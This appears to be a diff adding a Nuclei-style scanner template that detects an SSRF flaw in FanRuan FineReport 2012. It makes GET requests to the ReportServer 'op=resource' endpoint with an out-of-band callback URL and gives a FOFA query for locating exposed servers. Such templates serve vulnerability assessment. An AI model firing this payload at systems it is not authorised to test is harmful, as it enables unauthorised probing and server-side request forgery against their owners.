@@ -1,0 +1,27 @@
+id: fanruan-finereport-2012-ssrf
+info:
+  name: 帆软报表 2012 - ssrf
+  author: leadlife
+  severity: high
+  description: 帆软报表 2012 存在信息泄露漏洞，通过访问特定的Url获取造成SSRF
+  reference:
+    - https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-2012-SSRF%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: false
+    fofa-query: body="down.download?FM_SYS_ID"
+  tags: fanruan,finereport2,ssrf,2012,oob
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ReportServer?op=resource&resource={{interactsh-url}}"
+      - "{{BaseURL}}/WebReport/ReportServer?op=resource&resource={{interactsh-url}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
